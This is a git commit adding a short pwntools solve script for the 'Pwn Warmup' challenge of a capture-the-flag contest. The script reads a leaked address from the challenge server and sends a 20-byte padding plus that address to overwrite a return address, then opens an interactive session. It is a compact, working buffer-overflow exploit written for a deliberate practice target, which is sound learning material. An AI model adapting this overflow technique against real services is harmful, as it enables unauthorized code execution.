5f3aa5b9f864dcb6a519f87a5ce4a0b3fa429e29
xenonminer <46347858+xenonminer@users.noreply.github.com>
2021-08-01 11:59:27 -0700

    Update solve.py

--- pwn/Pwn Warmup/solve.py
+++ pwn/Pwn Warmup/solve.py
@@ -1,1 +1,29 @@
+from pwn import *
 
+exe = ELF("warmup_pwn")
+
+context.binary = exe
+
+
+def conn():
+        if False:
+                return process([exe.path])
+        else:
+                return remote("pwn-warmup.chal.uiuc.tf", 1337)
+
+
+def main():
+        r = conn()
+        r.recvuntil("This is pwn_warmup, go")
+        data = r.read()
+        data = data.decode("utf-8")
+        data = data.split("=")
+        memaddress = data[-1]
+        memaddress = memaddress.strip()
+        memaddress = int(memaddress ,16)
+        r.sendline(b'A'*20 + p64(memaddress))
+        r.interactive()
+
+
+if __name__ == "__main__":
+        main()
